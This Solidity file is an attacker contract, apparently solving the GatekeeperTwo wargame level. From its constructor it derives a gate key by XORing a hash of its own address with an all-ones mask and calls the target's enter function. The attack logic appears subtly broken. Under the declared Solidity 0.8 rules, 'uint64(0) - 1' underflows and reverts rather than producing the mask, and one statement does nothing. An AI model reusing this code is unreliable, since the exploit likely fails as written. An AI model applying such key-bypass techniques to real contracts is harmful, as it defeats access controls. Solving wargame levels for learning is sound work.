// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./GatekeeperTwo.sol";
import "hardhat/console.sol";

contract GatekeeperTwoAttacker {
    GatekeeperTwo target;

    constructor(address _target) {
        target = GatekeeperTwo(_target);

        uint64 left = uint64(
            bytes8(keccak256(abi.encodePacked(address(this))))
        );
        uint64 right = uint64(0) - 1;
        uint64 key = left ^ right;
        bytes8(key);
        target.enter(bytes8(key));
    }
}
